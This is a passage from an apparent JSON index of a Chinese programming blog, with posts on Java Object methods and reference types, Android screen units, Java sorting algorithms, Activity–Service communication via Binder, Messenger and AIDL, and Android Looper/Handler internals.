从上面方法我们可以看出，首先String比较传入的Object对象是否和当前String为同一引用，是则返回true。如果不是，则判断传入的Object对象是否String对象及其子类实例，如果不是则返回false。再然后如果传入的参数是String的实例，则比较两个String的内容是否完全相同。 Object有哪些公用方法 Object中的public方法如图所示，简单介绍下每个方法： Object()，默认构造函数，略 getClass()，native和final方法，返回此对象的运行时类 hashCode()，native方法，返回此对象的哈希码数值 equals(Object)，详见上一个问题 toString()，返回一个代表该对象的字符串，此处返回：“类名@16进制哈希码” notify()，native和final方法，唤醒在此对象监视器上等待的单个线程 notifyAll()，native和final方法，唤醒在此对象监视器等待上的所有线程 wait()，该方法有3个重载，作用是让当前线程处于等待状态，直到其他线程调用此对象的 notify() 方法或 notifyAll() 方法，或超过指定时间，或其他线程中断当前线程。 Java的四种引用，强弱软虚，用到的场景在Java中，对象的引用和JVM的GC有着密切的联系，对于对象我们有4中不同的引用： 强引用：我们平时普通创建对象的方法就是强引用，普通系统99%以上都是强引用。如果一个对象是强引用创建的，则需要手动置null，JVM的GC才能回收其内存，否则即使是报内存不足，也不会清理具有强引用的对象。 软引用：通过SoftReference方法创建为软引用，一般JVM的GC不会清理软引用，但会在发生OOM（out of memory）时清理软引用。一般软引用可以用来实现内存敏感的高速缓存。 弱引用：通过WeakReference方法创建即弱引用，弱引用的生命周期比软引用短很多，如果一个对象只具有弱引用，那么他会在JVM GC时被清理掉。JDK有使用弱引用实现的WeakHashMap，他会在GC时回收掉不怎么使用的键值对。 虚引用：通过PhantomReference方法创建即为虚引用，虚引用形同虚设，如果一个对象只具有虚引用，那么它就和没有任何引用一样，随时会被JVM当作垃圾进行回收。虚引用主要用来跟踪对象被垃圾回收的活动。","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"Android 关于dp dip sp px dpi density解析","slug":"Android-关于dp-dip-sp-px-dpi-density解析","date":"2016-03-12T03:42:16.000Z","updated":"2020-05-11T07:23:44.526Z","comments":true,"path":"2016/03/12/Android-关于dp-dip-sp-px-dpi-density解析/","link":"","permalink":"https://superxlcr.github.io/2016/03/12/Android-关于dp-dip-sp-px-dpi-density解析/","excerpt":"","text":"pxpx即像素（Pixel），1px代表了手机屏幕上一个物理的像素点。由于以px为单位的控件在不同手机上显示大小不一定相同，故Android不推荐使用px来设置控件大小： 分辨率分辨率通常表示为横轴像素长度和纵轴像素长度的乘积，如320*480等。 dpidpi的全称是Dots Per Inch，即点每英寸，一般被称为像素密度，它代表了一英寸里面有多少个像素点。计算方法为屏幕总像素点（即分辨率的乘积除以屏幕大小），常见的取值有120,160,240。举例：比如说这里有一款1920*1200分辨率的7寸平板，根据勾股定理，我们可以算到对角线的像素点约为2264，则其像素密度（dpi）为2264 / 7 = 323 densitydensity直译为密度，它的计算公式为屏幕dpi除以160点每英寸，由于单位除掉了，故density只是一个比值，常见取值为1.0,1.5等。在Android中我们可以通过下面代码获取当前屏幕的density： 1getResources().getDisplayMetrics().density; dp（dip）dp，也叫做dip，全称为Density independent pixels，叫做设备独立像素。他是Android为了解决众多手机dpi不同所定义的单位，谷歌官方的解释如下：Density-independent pixel (dp) A virtual pixel unit that you should use when defining UI layout, to express layout dimensions or position in a density-independent way.The density-independent pixel is equivalent to one physical pixel on a 160 dpi screen, which is the baseline density assumed by the system for a “medium” density screen. At runtime, the system transparently handles any scaling of the dp units, as necessary, based on the actual density of the screen in use. The conversion of dp units to screen pixels is simple: px = dp * (dpi / 160). For example, on a 240 dpi screen, 1 dp equals 1.5 physical pixels. You should always use dp units when defining your application’s UI, to ensure proper display of your UI on screens with different densities.从上文我们可以看出，dp是一种虚拟抽象的像素单位，他的计算公式为：px = dp * (dpi / 160) = dp * density。因此在dpi大小为160的手机上，1dp = 1px，而在dpi大小为320的手机上，1dp = 2px，即在屏幕越大的手机上，1dp代表的像素也越大。因此我们定义控件大小的时候应该使用dp代替使用px。 spsp是Android中定义字体大小的一种单位，全称为Scaled Pixels，叫做放大像素。sp会根据用户手机上设定的字体大小而改变，在用户手机字体大小设置为正常的情况下，1sp = 1dp。sp与px之间的密度比例可以通过如下代码获取： 1getResources().getDisplayMetrics().scaledDensity; 资源文件分辨率一般而言，我们存放资源文件的目录（res）会有多个子目录，这些子目录代表了不同系统屏幕分辨率： 密度 中文 dpi 分辨率 比例 ldpi 低分辨率 120以下 240*320 3 mdpi 中分辨率 120~160 320*480 4 hdpi 高分辨率 160~240 480*800 6 xhdpi 超高分辨率 240~320 720*1280 8 xxhdpi 超超高分辨率 320~480 1080*1920 12 xxxhdpi 超超超高分辨率 480~640 3840*2160 16 当我们在手机上加载资源时，系统首先会从手机对应分辨率等级的子目录下找资源文件，如果找不到的情况下，会使用别的分辨率的文件进行缩放处理。 找不到对应分辨率资源文件情况对于drawable资源，当应用在设备对应dpi目录下没有找到某个资源时，遵循“先高再低”原则，会从附近的分辨率获取图片，然后按比例进行缩放： 比如，当前为xhdpi设备，并且只有以下几个目录，则drawable的寻找顺序为：xhdpi-&gt;xxhdpi-&gt;xxxhdpi(如果没有更高的了)-&gt;nodpi(如果有的话)-&gt;hdpi-&gt;mdpi，如果在xxhdpi中找到目标图片，则压缩2/3来使用，如果在mdpi中找到图片，则放大2倍来使用。 因此，以现在主流设备来说一般可能在drawable-xxhdpi放置一份即可，这样可以尽量避免Android为我们放大图片所导致的OOM 对于values资源，当应用设备在当前dpi对应目录的demins.xml中没有找到目标条目时，采用“就近匹配”原则： 比如，当前为hdpi设备，并且只有以下几个目录，则values的寻找顺序为：hdpi-&gt;xhdpi-&gt;mdpi-&gt;values，即先向上级dpi目录查找，再向下级dpi目录查找，最后一路向下查找到values目录，如果values下都找不到，就只有找values-ldpi，当然，现在有这个目录的应用不多了。 附：dp与px，sp与px转换的代码12345678910111213141516171819202122232425262728293031323334353637public class DisplayUtil &#123; /** * 将px值转换为dip或dp值，保证尺寸大小不变 * */ public static int px2dip(Context context, float pxValue) &#123; final float scale = context.getResources().getDisplayMetrics().density; return (int) (pxValue / scale + 0.5f); &#125; /** * 将dip或dp值转换为px值，保证尺寸大小不变 * */ public static int dip2px(Context context, float dipValue) &#123; final float scale = context.getResources().getDisplayMetrics().density; return (int) (dipValue * scale + 0.5f); &#125; /** * 将px值转换为sp值，保证文字大小不变 * */ public static int px2sp(Context context, float pxValue) &#123; final float fontScale = context.getResources().getDisplayMetrics().scaledDensity; return (int) (pxValue / fontScale + 0.5f); &#125; /** * 将sp值转换为px值，保证文字大小不变 * */ public static int sp2px(Context context, float spValue) &#123; final float fontScale = context.getResources().getDisplayMetrics().scaledDensity; return (int) (spValue * fontScale + 0.5f); &#125; &#125; 除此以外，我们还可以使用 1android.util.TypedValue#applyDimension(int unit, float value, DisplayMetrics metrics) 来进行dp、sp与px间的转换","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"资源文件","slug":"资源文件","permalink":"https://superxlcr.github.io/tags/资源文件/"}]},{"title":"计算机网络原理大纲思维导图","slug":"计算机网络原理大纲思维导图","date":"2016-03-11T12:13:32.000Z","updated":"2020-05-11T07:23:44.904Z","comments":true,"path":"2016/03/11/计算机网络原理大纲思维导图/","link":"","permalink":"https://superxlcr.github.io/2016/03/11/计算机网络原理大纲思维导图/","excerpt":"","text":"以下本人总结的大三学习的计算机网络原理大纲思维导图：","categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/categories/计算机网络/"}],"tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/tags/计算机网络/"},{"name":"思维导图","slug":"思维导图","permalink":"https://superxlcr.github.io/tags/思维导图/"},{"name":"大纲","slug":"大纲","permalink":"https://superxlcr.github.io/tags/大纲/"}]},{"title":"算法导论小结（一）","slug":"算法导论小结（一）","date":"2016-03-10T14:41:27.000Z","updated":"2020-05-11T07:23:44.884Z","comments":true,"path":"2016/03/10/算法导论小结（一）/","link":"","permalink":"https://superxlcr.github.io/2016/03/10/算法导论小结（一）/","excerpt":"","text":"用了几个月磕磕绊绊的总算把《算法导论》一书看完了，在此写篇博客总结一下学习到的知识。首先先放上《算法导论》的思维导图：由于本人的理解能力有限，故部分较难懂的内容没有加入到该思维导图中。 排序排序问题是我们日常生活中经常遇到的一个问题，因此算法导论也把排序作为整个算法介绍的入门篇。在这么多排序算法里面，目前经典的排序算法有以下几种： 插入排序对于少量元素的排序，插入排序是一个有效的算法。它的工作方式就像我们排序扑克牌一样，每次把一张新的扑克牌插入到已经排好序的序列中。假设排序序列的长度为n，由于插入排序每次加入一个新的元素都需要遍历几乎整个排好序的序列，故他的时间复杂度为$O(n^2)$。以下为插入排序的Java代码： 12345678910111213141516171819202122232425public class Algorithm &#123; public static void main(String[] args) &#123; int A[] = &#123;5, 2, 4, 6, 1, 3&#125;; InsertionSort(A); for(int num : A) System.out.println(num); &#125; // 插入排序 public static void InsertionSort(int A[]) &#123; for (int i = 1; i &lt; A.length; i++) &#123; int key = A[i]; int j = i-1; while(j &gt;= 0 &amp;&amp; A[j] &gt; key) &#123; A[j+1] = A[j]; j--; &#125; A[j+1] = key; &#125; &#125; &#125; 冒泡排序冒泡排序与插入排序类似，也是一种较为简单的排序算法。冒泡排序会重复地走访过要排序的数列，一次比较两个元素，如果他们的顺序错误就把他们交换过来，因此越大的元素会经由交换慢慢“浮”到数列的顶端，这就是这种排序方法命名的原因。由于需要两层循环遍历数组，所以冒泡排序的时间复杂度为$O(n^2)$。以下为冒泡排序的Java代码： 12345678910111213141516171819202122232425public class Algorithm &#123; public static void main(String[] args) &#123; int A[] = &#123;5, 2, 4, 6, 1, 3&#125;; BubbleSort(A); for(int num : A) System.out.println(num); &#125; // 冒泡排序 public static void BubbleSort(int A[]) &#123; for (int i = 0; i &lt; A.length; i++) &#123; for (int j = 1; j &lt; A.length - i; j++) &#123; // 如果前面的元素比后面的大，则发生交换 if (A[j-1] &gt; A[j]) &#123; int temp = A[j]; A[j] = A[j-1]; A[j-1] = temp; &#125; &#125; &#125; &#125; &#125; 实际上面的冒泡排序代码还可以进行一点小优化，要是循环中没有发生交换则可直接退出： 12345678910111213141516171819// 冒泡排序(优化) public static void BubbleSortII(int A[]) &#123; boolean swap = false; // 是否发生过交换 for (int i = 0; i &lt; A.length; i++) &#123; swap = false; for (int j = 1; j &lt; A.length - i; j++) &#123; // 如果前面的元素比后面的大，则发生交换 if (A[j-1] &gt; A[j]) &#123; swap = true; int temp = A[j]; A[j] = A[j-1]; A[j-1] = temp; &#125; &#125; // 没有发生过交换，已经排序完毕，可跳出循环 if (swap == false) break; &#125; &#125; 归并排序要提到归并排序就不得不讲到分治法（Divide and Conquer），分治法的思想是：把原问题分解成为几个规模较小，但类似于原问题的子问题，递归的去求解这些子问题，然后再合并这些子问题的解来建立原问题的解。归并排序就是是采用分治法的一个非常典型的应用。它是建立在归并操作上的一种有效的排序算法,该算法将已有序的子序列合并，得到完全有序的序列。用扑克牌来举例：在排序一副扑克牌的时候，我们现将其分成两叠大小相近的扑克牌，分别排序，然后我们再把这两叠已经排好序的扑克牌合并成一副更大的排好序的扑克牌，此时只需要每次比较两叠扑克牌的第一张牌即可。归并排序的图解如下：设序列中有N个元素需要排序，则由上图易得可以把排序过程分为logN（以2为低的对数）次处理，每次循环N次，故归并排序的时间复杂度为$O(n*logn)$。归并排序的Java代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142public class Algorithm &#123; public static void main(String[] args) &#123; int A[] = &#123;5, 2, 4, 6, 1, 3&#125;; MergeSort(A, 0, A.length-1); for(int num : A) System.out.println(num); &#125; public static void MergeSort(int A[], int start, int end) &#123; if (start &lt; end) &#123; // 中点 int mid = (start+end)/2; // 子序列分别排序 MergeSort(A, start, mid); MergeSort(A, mid+1, end); // 合并 // 把子序列存到新数组中 int leftLen = mid-start+1, rightLen = end-mid; int leftCounter = 0, rightCounter = 0, numCounter = start; int L[] = new int[leftLen], R[] = new int[rightLen]; for (int i = 0; i &lt; leftLen; i++) L[i] = A[start+i]; for (int i = 0; i &lt; rightLen; i++) R[i] = A[mid+1+i]; // 比较子序列第一项元素 while(leftCounter &lt; leftLen &amp;&amp; rightCounter &lt; rightLen) &#123; if(L[leftCounter] &lt; R[rightCounter]) A[numCounter++] = L[leftCounter++]; else A[numCounter++] = R[rightCounter++]; &#125; // 把剩余的子序列加到后面 while(leftCounter &lt; leftLen) A[numCounter++] = L[leftCounter++]; while(rightCounter &lt; rightLen) A[numCounter++] = R[rightCounter++]; &#125; &#125; &#125; 非递归版本的归并排序： 12345678910111213141516171819202122232425262728293031323334353637383940public class Algorithm &#123; public static void main(String[] args) &#123; int A[] = &#123; 5, 2, 4, 1, 3, 6&#125;; MergeSort(A); for (int num : A) System.out.println(num); &#125; public static void MergeSort(int A[]) &#123; int len = A.length; int temp[] = new int[len]; int leftMin, leftMax, rightMin, rightMax; // leftMin ～ leftMax, rightMin // ～ rightMax for (int i = 1; i &lt; len; i *= 2) &#123; leftMin = leftMax = rightMin = rightMax = 0; while (leftMin &lt; len) &#123; rightMin = leftMax = leftMin + i; rightMax = rightMin + i; if (rightMax &gt; len) rightMax = len; if (rightMin &gt; rightMax) leftMax = rightMin = rightMax; int counter = 0; while (leftMin &lt; leftMax &amp;&amp; rightMin &lt; rightMax) temp[counter++] = A[leftMin] &gt; A[rightMin] ? A[rightMin++] : A[leftMin++]; while (leftMin &lt; leftMax) A[--rightMin] = A[--leftMax]; while (counter &gt; 0) A[--rightMin] = temp[--counter]; leftMin = rightMax; &#125; &#125; &#125; &#125; 堆排序首先我们来看看什么是堆：如上图所示（二叉）堆是一个数组，它可以被看成一个近似的完全二叉树，树上每一个结点对应数组中的一个元素。除了最底层外，该树是完全充满的，而且是从左到右填充。在堆中，给定一个结点下标i（对于起始下标为1而言），则它的父节点为i/2，它的左孩子下标为i2，右孩子下标为i2+1。堆中结点的高度被定义为该结点到叶结点的最长简单路径，由数学公式可得含N个元素的堆高度为logN。二叉堆可以分为两种形式：最大堆和最小堆，他们除了满足堆的基本性质外，最大堆满足：除了根结点外，所有结点的值小于等于父节点，最小堆反之。在堆排序算法中，我们使用最大堆，最小堆通常用于构造优先队列。以下为Java的堆排序： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public class Algorithm &#123; public static void main(String[] args) &#123; int A[] = &#123; 5, 2, 4, 6, 1, 3 &#125;; HeapSort(A); for (int num : A) System.out.println(num); &#125; public static void HeapSort(int A[]) &#123; BuildMaxHeap(A); for (int i = A.length - 1; i &gt; 0; i--) &#123; // 把根结点和最后的结点对调 int temp = A[i]; A[i] = A[0]; A[0] = temp; // 对根结点进行最大堆性质维护 MaxHeapify(A, i, 0); &#125; &#125; /** * 建立最大堆 * * @param A * 数组 */ private static void BuildMaxHeap(int A[]) &#123; int heapSize = A.length; // heapSize/2 ~ heapSize-1 均为叶结点，对非叶结点调用维护最大堆性质方法即可 for (int i = heapSize / 2 - 1; i &gt;= 0; i--) MaxHeapify(A, heapSize, i); &#125; /** * 维护最大堆的性质，调整下标为i的结点位置 * @param A 数组 * @param heapSize 堆大小 * @param index 结点下标 */ private static void MaxHeapify(int A[], int heapSize, int index) &#123; int left = index*2+1, right = index*2+2, largest = index; // 选取父结点，左结点，右结点中值最大的当父结点 if (left &lt; heapSize &amp;&amp; A[left] &gt; A[index]) largest = left; if (right &lt; heapSize &amp;&amp; A[right] &gt; A[largest]) largest = right; // 若子结点充当了父结点，对子结点递归调用方法维护最大堆性质 if (largest != index) &#123; int temp = A[largest]; A[largest] = A[index]; A[index] = temp; MaxHeapify(A, heapSize, largest); &#125; &#125; &#125; 首先来看看MaxHeapify方法，该方法是用于维护最大堆性质的方法。若方法调整的结点发生了交换，则对其子结点递归的调用该方法继续维护最大堆性质，故该方法的调用次数与堆的高度有关，时间复杂度为$O(h) = O(logN)$。 再来看看BuildMaxHeap方法，该方法用于把一个无序的数组构造成一个最大堆。该方法自底向上对非叶结点调用MaxHeapify，咋看其时间复杂度为$O(N*logN)$，但由数学推导可得其紧确时间复杂度为线性时间，此处不给出证明。 最后再来看HeapSort方法，堆排序首先把一个数组构造成最大堆，然后每次让堆的根结点（堆最大的元素）和堆最后的结点交换，并减少堆的大小，然后再对根结点调用MaxHeapify方法调整其位置。堆排序总共调用了N次MaxHeapify方法，故其时间复杂度为$O(N*logN)$ 快速排序快速排序也被称为霍尔排序，虽然快速排序的最坏时间复杂度为$O(N^2)$，但是快速排序通常是实际排序应用中最好的选择，因为他的平均性能很好，期望时间复杂度为$O(N*lgN)$。快速排序与归并排序类似，都使用了分治思想。快速排序每次从数组中选择一个元素作为主元，把比主元小的元素放在其前面，把比主元大的元素方法主元的后面，然后再对其前后两个子数组进行相同的操作。快速排序的Java代码如下所示： 12345678910111213141516171819202122232425262728293031323334public class Algorithm &#123; public static void main(String[] args) &#123; int A[] = &#123;5, 2, 4, 6, 1, 3&#125;; QuickSort(A, 0, A.length-1); for(int num : A) System.out.println(num); &#125; public static void QuickSort(int A[], int start, int end) &#123; if (start &lt; end) &#123; // 主元 int key = A[end]; int i = start-1; for (int j = start; j &lt; end; j++) &#123; // 比key小的数放在前面 if (A[j] &lt; key) &#123; i++; int temp = A[j]; A[j] = A[i]; A[i] = temp; &#125; &#125; i++; A[end] = A[i]; A[i] = key; // 对子数组进行同样的操作 QuickSort(A, start, i-1); QuickSort(A, i+1, end); &#125; &#125; &#125; 上面的代码固定选取当前数组的最后一个元素作为主元，如果想要快速排序的平均性能更好，可以随机选取数组中的元素作为主元来减少出现最坏情况的概率。","categories":[{"name":"算法","slug":"算法","permalink":"https://superxlcr.github.io/categories/算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://superxlcr.github.io/tags/算法/"}]},{"title":"Android Activity与Service通信","slug":"Android-Activity与Service通信","date":"2016-03-09T15:01:12.000Z","updated":"2020-05-11T07:23:44.493Z","comments":true,"path":"2016/03/09/Android-Activity与Service通信/","link":"","permalink":"https://superxlcr.github.io/2016/03/09/Android-Activity与Service通信/","excerpt":"","text":"在Android中，Activity和Service分别管理着应用的前台和后台，他们都是相当重要的四大组件之一，那么Activity和Service之间是如何通信的呢？以下总结了四种可行的方法： 方法一：Binder类该方法要求我们构造一个Binder类来封装Service实例，并在Service类中重写onBind方法返回该binder对象： 123456789101112131415161718public class MyService extends Service &#123; @Override public IBinder onBind(Intent intent) &#123; return new MyBinder(); &#125; class MyBinder extends Binder &#123; /** * 获取service实例 * @return */ public MyService getService() &#123; return MyService.this; &#125; &#125; &#125; 在Activity中我们则需要使用bindService方法绑定Service，并传入一个ServiceConnection参数，通过其onServiceConnected方法来获取binder实例，进而获取service实例： 1234567891011121314151617181920212223242526public class MyActivity extends Activity&#123; // 服务实例 private MyService myService = null; private ServiceConnection connection = new ServiceConnection() &#123; @Override public void onServiceDisconnected(ComponentName name) &#123; &#125; @Override public void onServiceConnected(ComponentName name, IBinder service) &#123; // 获取服务实例 myService = ((MyService.MyBinder)service).getService(); &#125; &#125;; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Intent intent = new Intent(this, MyService.class); bindService(intent, connection, BIND_AUTO_CREATE); &#125; &#125; 方法二：通过内部类广播我们可以分别在Service和Activity中实现两个广播内部类，当两个组件需要互相通信的时候只要发送适当的广播即可： 123456789101112131415public class MyService extends Service &#123; @Override public IBinder onBind(Intent intent) &#123; return null; &#125; class MyServiceBroadcastReceiver extends BroadcastReceiver &#123; @Override public void onReceive(Context context, Intent intent) &#123; // do something &#125; &#125; &#125; 123456789101112131415161718public class MyActivity extends Activity&#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Intent intent = new Intent(this, MyService.class); startService(intent); &#125; class MyActivityBroadcastReceiver extends BroadcastReceiver &#123; @Override public void onReceive(Context context, Intent intent) &#123; // do something &#125; &#125; &#125; 方法三：MessengerMessenger类的官方注释如下： 123456/** * Reference to a Handler, which others can use to send messages to it. * This allows for the implementation of message-based communication across * processes, by creating a Messenger pointing to a Handler in one process, * and handing that Messenger to another process. */ 从注释我们可以得知，这是一个基于Message的，使用Handler来处理消息的，进程间组件通信的工具类。Messenger的使用方法如下：Service类： 123456789101112131415161718192021222324252627282930313233343536public class MyRemoteService extends Service &#123; private final String TAG = \"MyService\"; @Override public IBinder onBind(Intent intent) &#123; // 返回Messenger的Binder对象 return messenger.getBinder(); &#125; @Override public void onCreate() &#123; super.onCreate(); Log.v(TAG, \"onCreate\"); &#125; // 传入一个Handler参数用来处理消息，Handler默认构造方法绑定主线程 private Messenger messenger = new Messenger(new Handler() &#123; public void handleMessage(android.os.Message msg) &#123; // 收到消息打印Log Log.v(TAG, \"Get Message from remote activity : \" + ((Bundle)msg.obj).getString(\"String\")); // 回复服务端消息 Message msgReply = Message.obtain(); // 使用Bundle类包装信息 Bundle bundle = new Bundle(); bundle.putString(\"String\", \"From Remote Service\"); msgReply.obj = bundle; try &#123; msg.replyTo.send(msgReply); &#125; catch (RemoteException e) &#123; e.printStackTrace(); &#125; &#125;; &#125;); &#125; 在Service类中我们构造了一个Messenger对象，并在onBind方法里调用了Messenger的getBinder方法，返回了一个IBinder对象。我们在构造Messenger对象时传入了一个Handler参数，该Handler用于处理从服务端接收到的Message。此处我们把接收到的消息通过Log打印出来，并获取Message中的replyTo属性发送一条消息作为回复。 12345678&lt;service android:name=\"com.example.test.MyRemoteService\" android:enabled=\"true\" android:exported=\"true\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"com.example.test.messenger\"/&gt; &lt;category android:name=\"android.intent.category.DEFAULT\"/&gt; &lt;/intent-filter&gt; &lt;/service&gt; 以上是Service注册表的信息，记得设置好Action和exported属性以便外部应用访问，此处把enabled属性设置为true允许其让系统启动。接下来我们来看看另一个应用中Activity的代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public class MyActivity extends Activity &#123; private final String TAG = \"MyActivity\"; // 用于发送消息 private Messenger messengerSender = null; // 用于接收消息 private Messenger messengerReceiver = new Messenger(new Handler() &#123; public void handleMessage(android.os.Message msg) &#123; // 收到消息打印Log Log.v(TAG, \"Get Message from remote Service : \" + ((Bundle)msg.obj).getString(\"String\")); &#125;; &#125;); private ServiceConnection connection = new ServiceConnection() &#123; @Override public void onServiceDisconnected(ComponentName name) &#123; &#125; @Override public void onServiceConnected(ComponentName name, IBinder service) &#123; // 获取来自Service的Binder对象，构造MessengerSender用于发送消息 messengerSender = new Messenger(service); // 发送消息 Message message = new Message(); // 设置消息返回的Messenger message.replyTo = messengerReceiver; // 设置消息内容 Bundle bundle = new Bundle(); bundle.putString(\"String\", \"From Activity\"); message.obj = bundle; try &#123; messengerSender.send(message); &#125; catch (RemoteException e) &#123; e.printStackTrace(); &#125; &#125; &#125;; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); // 绑定远程Service Intent intent = new Intent(); intent.setAction(\"com.example.test.messenger\"); bindService(intent, connection, Context.BIND_AUTO_CREATE); &#125; &#125; 在Activity中我们构造了两个Messenger，一个传入Handler参数构造用于处理接收到的Message，一个传入在ServiceConnection中获取的IBinder对象用于发送Message。在Activity中我们通过指定Action，使用bindService方法完成Activity与Service的绑定。此处我们在与Service建立连接后发送了一条消息给Service，并把Service返回的消息给打印出来。从Logcat信息中我们可以看出Activity和Service通信成功了，并且是在两个应用，各自的进程当中（PID不同）。值的注意的是，通信过程中Message的obj对象必须是实现了Parcelable接口的，否则系统会报RuntimeException:Can’t marshal non-Parcelable objects across processes.一般而言我们只需要使用Bundle类包装要传输的数据即可。 方法四：AIDLAIDL：Android Interface Definition Language，即Android接口定义语言。要是使用Messenger还不能满足你的需求，我们就必须使出AIDL这项工具来实现进程间通信了。那么AIDL适用于什么场景呢？我们来看看官方的解释：Using AIDL is necessary only if you allow clients from different applications to access your service for IPC and want to handle multithreading in your service. If you do not need to perform concurrent IPC across different applications, you should create your interface by implementing a Binder or, if you want to perform IPC, but do not need to handle multithreading, implement your interface using a Messenger. Regardless, be sure that you understand Bound Services before implementing an AIDL.上面最重要的就是第一句话：只有当你允许来自不同的客户端访问你的服务并且需要处理多线程问题时你才必须使用AIDL。在其他情况下你都可以选择其他方法，如使用Messager，也能跨进程通讯。可见AIDL是处理多线程、多客户端并发访问的。那么接下来我们就来看看如何使用AIDL吧：首先我们在src下面编写.aidl文件定义接口，其语法与java类似： 12345package com.example.aidl; interface IRemoteService &#123; String sendMessage(String s); &#125; 在定义了该aidl文件后，保存后Android编译器会在gen目录下自动生成对应的文件：注意，在Activity和Service所在的应用中都必须有完全相同的aidl文件，包名称也必须相同，否则会报java.lang.SecurityException: Binder invocation to an incorrect interface的错误。接下来我们就可以利用aidl定义的接口编写Service和Activity了： 123456789101112131415161718192021222324252627public class MyRemoteService extends Service &#123; private final String TAG = \"MyService\"; @Override public IBinder onBind(Intent intent) &#123; // 返回IRemoteService.Stub对象 return binder; &#125; @Override public void onCreate() &#123; super.onCreate(); Log.v(TAG, \"onCreate\"); &#125; private final IRemoteService.Stub binder = new IRemoteService.Stub() &#123; @Override public String sendMessage(String s) throws RemoteException &#123; // 通过Log打印传入的字符串 Log.v(TAG, \"String from Activity : \"+s); return \"Service Message!\"; &#125; &#125;; &#125; 在Service中我们实现了IRemoteService内部的Stub类，并把它当做返回值在onBind方法返回给建立连接的组件。Service的xml代码与Messenger相比没有什么改动，故不再贴出来。接下来是Activity的代码： 1234567891011121314151617181920212223242526272829303132333435public class MyActivity extends Activity &#123; private final String TAG = \"MyActivity\"; private IRemoteService mRemoteService; private ServiceConnection connection = new ServiceConnection() &#123; @Override public void onServiceDisconnected(ComponentName name) &#123; &#125; @Override public void onServiceConnected(ComponentName name, IBinder service) &#123; mRemoteService = IRemoteService.Stub.asInterface(service); try &#123; Log.v(TAG, mRemoteService.sendMessage(\"Activity Message!\")); &#125; catch (RemoteException e) &#123; e.printStackTrace(); &#125; &#125; &#125;; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Log.v(TAG, \"onCreate\"); // 绑定远程Service Intent intent = new Intent(); intent.setAction(\"com.example.test.aidl\"); bindService(intent, connection, Context.BIND_AUTO_CREATE); &#125; &#125; 我们利用Stub的asInterface方法构造了用于通信的IRemoteService接口，通过接口定义的sendMessage方法向另一个进程中的Service发送了一条消息，并把Service返回的信息打印了出来。通过Logcat我们可以发现，在两个进程中的Activity和Service通信成功了（PID不同）：值的注意的是Activity是在主线程中与Service通信，而Service却并没有在主线程通信，而是新开启了一个线程和Activity通信（TID不同）。这也印证了官方对于AIDL工具的定位，当我们需要在不同进程中实现组件通信，并且需要处理多线程问题时，才使用AIDL，不然我们还是用回简单方便的Messenger吧。总结: Activity调用bindService方法，通过IBinder对象得到Service的实例，这样Activity可以直接调用到Service中的方法，如果需要Service主动通知Activity，我们还可以为其添加回调方法。 Service向Activity发送消息，可以使用广播，当然Activity要注册相应的接收器。比如Service要向多个Activity发送同样的消息的话，用这种方法就更好。 当Activity和Service分别处在不同的应用之中时，我们可以通过使用Messenger类来完成两组件之间的基于Message机制的交流通信，使用Handler来处理发送接收的消息。 当不仅Activity和Service所处应用不同，而且我们还需要处理多线程通信问题时，我们就需要使用AIDL来进行通信了。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"通信","slug":"通信","permalink":"https://superxlcr.github.io/tags/通信/"}]},{"title":"Android Looper和Handler小结","slug":"Android-Looper和Handler小结","date":"2016-03-08T09:17:39.000Z","updated":"2020-05-11T07:23:44.502Z","comments":true,"path":"2016/03/08/Android-Looper和Handler小结/","link":"","permalink":"https://superxlcr.github.io/2016/03/08/Android-Looper和Handler小结/","excerpt":"","text":"Android系统中的Java应用程序和其他系统上类似，都是靠消息驱动来工作的。他们都拥有一个消息队列，可以往队列中投递新消息，他们还有一个消息循环，用于不断地从队列中取出消息来处理。在Android系统中，这两项工作主要由Looper和Handler来实现。 Looper类分析我们先从官方的一个例子来研究： 123456789101112131415class LooperThread extends Thread &#123; public Handler mHandler; public void run() &#123; Looper.prepare(); mHandler = new Handler() &#123; public void handleMessage(Message msg) &#123; // process incoming messages here &#125; &#125;; Looper.loop(); &#125; &#125; 根据官方文档的说明，在使用Looper的时候，我们得先调用Looper的prepare方法（第5行所示），然后再调用Looper的loop方法（第13行所示）。我们先来看看Looper的prepare方法： 12345678910111213141516/** Initialize the current thread as a looper. * This gives you a chance to create handlers that then reference * this looper, before actually starting the loop. Be sure to call * &#123;@link #loop()&#125; after calling this method, and end it by calling * &#123;@link #quit()&#125;. */ public static void prepare() &#123; prepare(true); &#125; private static void prepare(boolean quitAllowed) &#123; if (sThreadLocal.get() != null) &#123; throw new RuntimeException(\"Only one Looper may be created per thread\"); &#125; sThreadLocal.set(new Looper(quitAllowed)); &#125; 从注释我们可以得知这个方法是用来为当前线程初始化一个looper的。在第12行的sThreadLocal变量是一个当前线程局部变量，用于存储当前线程的某些值，拥有get和set两个重要方法。从代码我们可以得知，如果当前线程没有设置looper这个变量，那么prepare方法就会为其设置一个，如果有就会报错。接下来我们来看看Looper的构造函数： 1234private Looper(boolean quitAllowed) &#123; mQueue = new MessageQueue(quitAllowed); mThread = Thread.currentThread(); &#125; 